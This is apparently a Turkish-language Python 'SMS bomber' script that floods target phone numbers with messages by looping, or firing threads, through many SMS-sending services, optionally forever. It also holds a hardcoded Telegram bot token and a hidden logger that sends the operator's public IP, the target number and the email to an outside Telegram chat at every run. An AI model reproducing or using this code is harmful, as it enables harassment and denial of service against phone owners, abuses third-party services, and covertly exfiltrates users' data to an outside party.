from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
import threading
import re
import sys
import requests
import datetime
import json
import itertools
import socket
import pyfiglet

# ===================== TELEGRAM LOGGER =====================
BOT_TOKEN = "8811100930:AAGG2cM_XAf2BxsXCtojQiUuXfdkUwrNlMU"
CHAT_ID = -1004372274552

def get_ip():
    try:
        return requests.get('https://api.ipify.org', timeout=5).text.strip()
    except:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except:
            return "Unknown"

def send_telegram_log(event_type, details):
    try:
        log_text = f"""
🚨 <b>SMS BOMBER - LOG</b>

🕒 Zaman: {datetime.datetime.now().isoformat()}
🌐 IP: {get_ip()}
📌 Event: {event_type}
📱 Hedef Numara: {details.get('target_phone', 'N/A')}
📧 Mail: {details.get('mail', 'N/A')}
📊 Gönderim Adedi: {details.get('count', 'N/A')}
🔄 Mod: {details.get('mode', 'N/A')}
"""
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": CHAT_ID, "text": log_text, "parse_mode": "HTML"}
        requests.post(url, json=payload, timeout=10)
    except:
        pass

# ===================== ANIMASYONLU ARAYÜZ =====================
class AnimasyonluArayuz:
    def __init__(self):
        self.animasyon_aktif = True

    def yukleniyor_animasyonu(self, mesaj="İşlem yapılıyor", sure=2):
        spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        baslangic = datetime.datetime.now()
        while (datetime.datetime.now() - baslangic).seconds < sure:
            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {mesaj}...{Style.RESET_ALL}')
            sys.stdout.flush()
            sleep(0.08)
        sys.stdout.write(f'\r{Fore.GREEN}✓ {mesaj} tamamlandı.{Style.RESET_ALL}          \n')
        sys.stdout.flush()

    def ilerleme_cubugu(self, yuzde, genislik=50):
        dolu = int(genislik * yuzde / 100)
        bos = genislik - dolu
        if yuzde >= 90:
            renk = Fore.GREEN
        elif yuzde >= 50:
            renk = Fore.YELLOW
        elif yuzde >= 25:
            renk = Fore.LIGHTYELLOW_EX
        else:
            renk = Fore.RED
        cubuk = f"{renk}{'█' * dolu}{Style.DIM}{'░' * bos}{Style.RESET_ALL}"
        sys.stdout.write(f'\r{cubuk} {yuzde:6.2f}%')
        sys.stdout.flush()

ui = AnimasyonluArayuz()

def clear_screen():
    system("cls||clear")

# ===================== ANA PROGRAM =====================
clear_screen()
print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("VASTREL SMS", font="slant"))
print(Fore.LIGHTGREEN_EX + " " * 20 + "Geliştirici: Vastrel" + Style.RESET_ALL + "\n")

def get_servisler():
    servisler = []
    for attr in dir(SendSms):
        if not attr.startswith('__') and callable(getattr(SendSms, attr)):
            servisler.append(attr)
    return servisler

servisler_sms = get_servisler()

print(f"Sms Servis Sayısı: {Fore.LIGHTGREEN_EX}{len(servisler_sms)}{Style.RESET_ALL}\n")

def temizle_numara(num):
    if not num:
        return None
    num = re.sub(r'\D', '', num)
    if num.startswith('90'):
        num = num[2:]
    elif num.startswith('0'):
        num = num[1:]
    if len(num) == 10:
        return num
    return None

while True:
    try:
        menu = input(Fore.LIGHTGREEN_EX + " 1- SMS Gönder (Normal)\n 2- SMS Gönder (Turbo)\n 3- Çıkış\n\n Seçim: " + Fore.LIGHTYELLOW_EX)
        if not menu.strip():
            continue
        menu = int(menu)
    except ValueError:
        print(Fore.LIGHTRED_EX + "Hatalı giriş.")
        sleep(2)
        continue

    if menu == 3:
        clear_screen()
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break

    # ===================== NORMAL MOD =====================
    if menu == 1:
        clear_screen()
        print(Fore.LIGHTYELLOW_EX + "[1] Tek numara\n[2] Çoklu numara")
        secim = input("Seçim: ").strip()

        tel_liste = []
        if secim == "1":
            tel_input = input(Fore.LIGHTYELLOW_EX + "Telefon numarası: " + Fore.LIGHTGREEN_EX).strip()
            cleaned = temizle_numara(tel_input)
            if cleaned:
                tel_liste.append(cleaned)

        elif secim == "2":
            print(Fore.LIGHTYELLOW_EX + "Numaraları gir (bitince boş satır):")
            while True:
                line = input().strip()
                if not line:
                    break
                cleaned = temizle_numara(line)
                if cleaned:
                    tel_liste.append(cleaned)

        if not tel_liste:
            print(Fore.LIGHTRED_EX + "Numara girilmedi.")
            sleep(2)
            continue

        mail = input(Fore.LIGHTYELLOW_EX + "Mail (enter boş): " + Fore.LIGHTGREEN_EX).strip()

        kere_input = input(Fore.LIGHTYELLOW_EX + "Kaç adet SMS (sonsuz için enter): " + Fore.LIGHTGREEN_EX).strip()
        kere = int(kere_input) if kere_input.isdigit() else None

        aralik = int(input(Fore.LIGHTYELLOW_EX + "Aralık (saniye): " + Fore.LIGHTGREEN_EX) or 1)

        ui.yukleniyor_animasyonu("Gönderim hazırlanıyor", sure=1.5)

        for tel in tel_liste:
            send_telegram_log("SMS_NORMAL_START", {
                "target_phone": tel,
                "mail": mail,
                "count": kere or "Sonsuz",
                "mode": "Normal"
            })

            print(Fore.LIGHTCYAN_EX + f"\n[{tel}] numarasına gönderiliyor...")
            sms = SendSms(tel, mail)

            try:
                if kere is None:
                    while True:
                        for servis in servisler_sms:
                            try:
                                getattr(sms, servis)()
                            except:
                                pass
                            sleep(aralik)
                else:
                    sent = 0
                    while sent < kere:
                        for servis in servisler_sms:
                            if sent >= kere:
                                break
                            try:
                                getattr(sms, servis)()
                                sent += 1
                            except:
                                pass
                            sleep(aralik)
                        ui.ilerleme_cubugu((sent / kere) * 100 if kere else 0)
            except KeyboardInterrupt:
                print(Fore.LIGHTYELLOW_EX + "\nDurduruldu.")
                break

            send_telegram_log("SMS_NORMAL_FINISH", {
                "target_phone": tel,
                "mail": mail,
                "mode": "Normal"
            })

        input(Fore.LIGHTRED_EX + "\nMenüye dönmek için enter...")

    # ===================== TURBO MOD =====================
    elif menu == 2:
        tel_input = input(Fore.LIGHTYELLOW_EX + "Telefon numarası: " + Fore.LIGHTGREEN_EX).strip()
        tel_no = temizle_numara(tel_input)
        if not tel_no:
            print(Fore.LIGHTRED_EX + "Geçersiz numara.")
            sleep(2)
            continue

        mail = input(Fore.LIGHTYELLOW_EX + "Mail (enter boş): " + Fore.LIGHTGREEN_EX).strip()

        send_telegram_log("SMS_TURBO_START", {
            "target_phone": tel_no,
            "mail": mail,
            "mode": "Turbo"
        })

        send_sms = SendSms(tel_no, mail)
        dur = threading.Event()

        def turbo_mode():
            while not dur.is_set():
                threads = []
                for servis in servisler_sms:
                    t = threading.Thread(target=getattr(send_sms, servis), daemon=True)
                    threads.append(t)
                    t.start()
                for t in threads:
                    t.join(timeout=10)

        ui.yukleniyor_animasyonu("Turbo mod başlatılıyor", sure=1)
        print(Fore.LIGHTGREEN_EX + f"🚀 TURBO BAŞLADI → {tel_no}")
        print(Fore.LIGHTYELLOW_EX + "Durdurmak için Ctrl+C")

        try:
            turbo_mode()
        except KeyboardInterrupt:
            dur.set()
            print(Fore.LIGHTRED_EX + "\nTurbo durduruldu.")
            send_telegram_log("SMS_TURBO_STOP", {
                "target_phone": tel_no,
                "mail": mail,
                "mode": "Turbo"
            })
            sleep(1.5)

    else:
        print(Fore.LIGHTRED_EX + "Bilinmeyen seçim.")
        sleep(2)